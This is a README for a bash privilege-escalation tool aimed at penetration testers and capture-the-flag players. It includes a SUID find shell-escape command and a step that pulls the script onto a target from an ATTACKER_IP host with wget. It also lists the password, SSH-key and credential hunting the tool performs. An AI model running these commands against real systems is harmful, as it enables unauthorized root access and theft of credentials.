# 🦍 linenum-gorilla

**Linux Privilege Escalation Suite** — One file. Pure bash. No dependencies.

An improved fork of [LinEnum-ng](https://github.com/strikoder/LinEnum-ng) with **embedded exploit commands** for every exploitable binary found.

## What's Different From LinEnum-ng?

LinEnum-ng tells you *"find is exploitable"*. Gorilla gives you the command:

```
 EXPLOITABLE: /usr/bin/find
  find . -exec /bin/sh -p \; -quit
```

| Feature | LinEnum-ng | gorilla.sh |
|---------|-----------|------------|
| SUID/sudo binary detection | ✅ | ✅ |
| **Exploit commands (copy-paste)** | ❌ | ✅ 100+ binaries |
| **Capabilities exploitation** | ❌ | ✅ with commands |
| Kernel CVE checks | ✅ | ✅ |
| Container detection | ✅ | ✅ |
| Group privesc (docker/lxd/disk) | ✅ | ✅ |
| Password hunting | ✅ | ✅ + .env files |
| **Writable cron script detection** | ❌ | ✅ |
| Username hunt (-u) | ✅ | ✅ |
| Sudo with password (-p) | ✅ | ✅ |
| Writable systemd services | ⚠️ | ✅ |
| Pure bash (no python needed) | ✅ | ✅ |

## Quick Start

```bash
# On Kali:
python3 -m http.server 80

# On target:
wget http://ATTACKER_IP/gorilla.sh
chmod +x gorilla.sh
./gorilla.sh
```

## Usage

```bash
# Basic run — no credentials:
./gorilla.sh

# With a found password — tests sudo and reminds to spray:
./gorilla.sh -p 'Summer2024!'

# Hunt files related to a specific user:
./gorilla.sh -u john

# Full run:
./gorilla.sh -p 'pass123' -u admin
```

## What It Checks

### Exploitation (with copy-paste commands)
1. **SUID binaries** → find, python, vim, bash, nmap, etc.
2. **Sudo permissions** → every exploitable binary
3. **Capabilities** → python, perl, node with ep caps
4. **Kernel CVEs** → PwnKit, Dirty Pipe, Dirty COW, Baron Samedit

### Enumeration
5. System info, kernel version
6. User/group info, writable passwd/shadow
7. Privileged groups (docker, lxd, disk, adm)
8. Environment (writable PATH, sensitive vars)
9. Cron jobs + **writable scripts in crontab**
10. Writable systemd service files
11. Running services as root
12. Network (listening ports, routes, ARP)
13. SSH keys (readable private keys, writable authorized_keys)
14. Interesting files (hidden, backups, recent)
15. Password hunting (wp-config, htpasswd, git-credentials, .env, SNMP, history)
16. Database default creds (MySQL, PostgreSQL)
17. Container detection (Docker, LXC, Kubernetes)
18. NFS no_root_squash
19. Writable /etc files and world-writable dirs
20. Username file hunt (`-u`)

## No Internet Heredoc Transfer

If wget/curl isn't available:

```bash
cat > /tmp/gorilla.sh << 'EOF'
<paste full script here>
EOF
chmod +x /tmp/gorilla.sh && /tmp/gorilla.sh
```

## Requirements

- Bash (available on every Linux system)
- Standard coreutils (find, grep, awk, ps, ss, etc.)
- No Python, no pip, no compilation

## Credits

- [strikoder/LinEnum-ng](https://github.com/strikoder/LinEnum-ng) — base enumeration methodology
- [GTFOBins](https://gtfobins.github.io/) — exploitation commands reference

## License

GPL-3.0
